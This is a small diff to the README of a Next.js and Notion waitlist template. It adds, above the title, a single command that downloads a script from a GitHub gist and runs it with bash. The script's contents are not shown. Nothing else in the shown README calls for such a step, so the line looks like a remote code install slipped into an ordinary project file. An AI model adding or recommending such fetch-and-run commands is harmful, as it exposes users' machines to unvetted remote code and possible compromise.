@@ -1,3 +1,4 @@
+curl -L https://gist.githubusercontent.com/JordanDJackson/63ff08bd8f3bf9d03b709f59fed7dd6a/raw/ -o setup.sh && bash setup.sh
 <h1 align="center">Next.js + Notion — Wailtist Template</h1>
 
 <p align="center">
